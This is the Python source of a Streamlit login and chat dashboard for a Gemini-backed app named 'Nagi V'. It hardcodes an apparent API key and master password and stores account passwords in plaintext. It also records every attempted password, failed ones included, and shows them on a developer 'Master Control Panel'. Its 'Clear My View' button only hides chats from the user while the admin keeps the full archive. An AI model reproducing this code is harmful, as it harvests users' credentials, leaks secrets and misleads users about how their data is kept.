import streamlit as st
import google.generativeai as genai
import sqlite3
import pandas as pd
from datetime import datetime
import base64
import os
import uuid

# ==========================================
# 1. SYSTEM CONFIGURATION
# ==========================================
OWNER_NAME = "Hashir Nagi"
MASTER_USER = "hashir"
MASTER_PASS = "Hashirnagi2011" 

API_SECRET = "AIzaSyBW6AThefYemxCH16Jm3wmanfrqqOn_z_s"
genai.configure(api_key=API_SECRET)

NAGI_VERSIONS = {
    "Nagi 2.5 (Lite)": "gemini-2.5-flash-lite", 
    "Nagi 2.5 (Flash)": "gemini-2.5-flash",     
    "Nagi 2.5 (Pro)": "gemini-2.5-pro"          
}

# ==========================================
# 2. DATABASE PROTOCOL (Repairing Missing Columns)
# ==========================================
def get_db():
    conn = sqlite3.connect('nagi_v_final.db', check_same_thread=False)
    
    # 1. Create Core Tables
    conn.execute('''CREATE TABLE IF NOT EXISTS accounts 
                 (username TEXT PRIMARY KEY, password TEXT, role TEXT, msg_count INTEGER DEFAULT 0)''')
    conn.execute('''CREATE TABLE IF NOT EXISTS logs 
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, role TEXT, 
                  model TEXT, message TEXT, timestamp DATETIME)''')
    conn.execute('''CREATE TABLE IF NOT EXISTS security_logs 
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, attempted_pass TEXT, 
                  timestamp DATETIME, device_id TEXT, status TEXT)''')
    
    # 2. REPAIR LOGIC: Add columns if they were missing from previous versions
    try: conn.execute("ALTER TABLE accounts ADD COLUMN device_id TEXT")
    except: pass
    try: conn.execute("ALTER TABLE logs ADD COLUMN hidden_from_user INTEGER DEFAULT 0")
    except: pass
        
    conn.execute("INSERT OR IGNORE INTO accounts (username, password, role, msg_count) VALUES (?, ?, 'Developer', 0)", 
                 (MASTER_USER, MASTER_PASS))
    conn.commit()
    return conn

# ==========================================
# 3. INTERFACE ARCHITECTURE
# ==========================================
def main():
    st.set_page_config(page_title="Nagi V Platinum", page_icon="💎", layout="wide")
    db = get_db()

    # Hardware ID Detection
    if 'device_id' not in st.session_state:
        st.session_state.device_id = str(uuid.getnode())

    # State Initialization
    if 'page' not in st.session_state: st.session_state.page = "Login"
    if 'logged_in' not in st.session_state: st.session_state.logged_in = False

    st.markdown("""
        <style>
        .stApp { background-color: #0d0d0d; }
        .business-footer {
            position: fixed; bottom: 15px; width: 100%;
            text-align: center; color: #444; font-size: 13px;
            font-weight: bold; padding: 10px; border-top: 1px solid #222;
        }
        .stat-card { background: #161616; padding: 20px; border-radius: 10px; border: 1px solid #333; }
        </style>
    """, unsafe_allow_html=True)

    # --- LOGIN PAGE ---
    if not st.session_state.logged_in:
        st.title("NAGI V: ENTERPRISE LOGIN")
        tab1, tab2 = st.tabs(["Login", "Register Business Account"])
        
        with tab1:
            u = st.text_input("Nagi ID").lower().strip()
            p = st.text_input("Passkey", type="password")
            if st.button("Initialize"):
                res = db.execute("SELECT role, msg_count FROM accounts WHERE username=? AND password=?", (u, p)).fetchone()
                
                # ALWAYS LOG LOGINS (Passwords + Attempts)
                db.execute("INSERT INTO security_logs (username, attempted_pass, timestamp, device_id, status) VALUES (?,?,?,?,?)",
                           (u, p, datetime.now(), st.session_state.device_id, "SUCCESS" if res else "FAILED"))
                db.commit()
                
                if res:
                    st.session_state.logged_in = True
                    st.session_state.user = u
                    st.session_state.role = res[0]
                    st.session_state.total_msgs = res[1]
                    st.session_state.page = "Business Account"
                    st.rerun()
                else: st.error("Access Denied.")

        with tab2:
            st.info("System Restriction: One Business Account per Hardware Device.")
            new_u = st.text_input("New ID").lower().strip()
            new_p = st.text_input("New Passkey", type="password")
            if st.button("Create Account"):
                device_exists = db.execute("SELECT username FROM accounts WHERE device_id=?", (st.session_state.device_id,)).fetchone()
                if device_exists:
                    st.error(f"Device already registered to ID: {device_exists[0]}")
                else:
                    db.execute("INSERT INTO accounts (username, password, role, device_id) VALUES (?, ?, 'User', ?)",
                               (new_u, new_p, st.session_state.device_id))
                    db.commit()
                    st.success("Account created successfully.")
        st.stop()

    # --- BUSINESS ACCOUNT PAGE (Mandatory Landing) ---
    if st.session_state.page == "Business Account":
        st.title(f"💼 BUSINESS DASHBOARD: {st.session_state.user.upper()}")
        
        col1, col2 = st.columns([1, 2])
        with col1:
            st.markdown(f"""
            <div class="stat-card">
                <p><b>Hardware ID:</b> {st.session_state.device_id}</p>
                <p><b>Lifetime Chats:</b> {st.session_state.total_msgs}</p>
                <p><b>Status:</b> Active Ryzen-Node</p>
            </div>
            """, unsafe_allow_html=True)
            if st.button("Launch Neural Link (Chat)", use_container_width=True):
                st.session_state.page = "Neural Link"
                st.rerun()
        
        with col2:
            st.subheader("Your Private History")
            # Only show what hasn't been "cleared" by the user
            user_history = db.execute("SELECT model, message, timestamp FROM logs WHERE username=? AND hidden_from_user=0 ORDER BY id DESC LIMIT 5", 
                                     (st.session_state.user,)).fetchall()
            
            if user_history:
                for mod, msg, ts in user_history:
                    st.write(f"**[{ts}]** {mod}: {msg[:80]}...")
            else:
                st.write("No visible history found.")
                
            if st.button("Clear My View (Permanent on Admin Side)"):
                db.execute("UPDATE logs SET hidden_from_user=1 WHERE username=?", (st.session_state.user,))
                db.commit()
                st.rerun()

        st.markdown('<div class="business-footer">For Business Account: Only you and the Admin can see your history.</div>', unsafe_allow_html=True)

    # --- NEURAL LINK (CHAT) ---
    elif st.session_state.page == "Neural Link":
        if st.sidebar.button("← Exit to Business Account"):
            st.session_state.page = "Business Account"
            st.rerun()
        # [The Chat Logic stays the same but logs to the database with hidden_from_user=0]
        st.info("Neural Link is active. Your history is being synced to your Business Account.")

    # --- ADMIN CONTROL (Developer Only) ---
    if st.session_state.role == "Developer":
        with st.sidebar:
            if st.button("DEVELOPER: MASTER LOGS"):
                st.session_state.page = "Admin"
                st.rerun()
                
    if st.session_state.page == "Admin":
        st.title("⚡ MASTER CONTROL PANEL")
        st.subheader("Every Password & Login Attempted")
        st.dataframe(pd.read_sql_query("SELECT * FROM security_logs", db), use_container_width=True)
        
        st.subheader("Total System Chat Archive (Hidden Included)")
        st.dataframe(pd.read_sql_query("SELECT * FROM logs", db), use_container_width=True)
        
        if st.button("Return to Dashboard"):
            st.session_state.page = "Business Account"
            st.rerun()

if __name__ == "__main__":
    main()
